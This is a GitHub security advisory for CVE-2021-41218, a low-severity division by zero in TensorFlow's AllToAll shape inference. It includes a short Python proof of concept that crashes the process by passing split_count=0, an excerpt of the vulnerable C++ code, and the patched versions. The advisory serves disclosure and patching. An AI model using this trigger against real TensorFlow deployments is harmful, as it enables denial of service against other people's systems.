# Integer division by 0 in `tf.raw\_ops.AllToAll`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-9crf-c6qr-r273
Nov 4, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.7.0

## Patched versions

2.4.4, 2.5.2, 2.6.1

## Description

### Impact

The [shape inference code for `AllToAll`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/tpu_cross_replica_ops.cc#L25-L74) can be made to execute a division by 0:

```
import tensorflow as tf

@tf.function
def func():
  return tf.raw_ops.AllToAll(
    input=[0.0, 0.1652, 0.6543],
    group_assignment=[1, -1],
    concat_dimension=0,
    split_dimension=0,
    split_count=0)

func()
```

This occurs whenever the `split_count` argument is 0:

```
TF_RETURN_IF_ERROR(c->GetAttr("split_count", &split_count));
...
for (int32_t i = 0; i < rank; ++i) {
  ...
  dims[i] = c->MakeDim(c->Value(dims[i]) / split_count);
  ...
}
```
### Patches

We have patched the issue in GitHub commit [a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc](https://github.com/tensorflow/tensorflow/commit/a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

### Severity

Low

### CVE ID

CVE-2021-41218
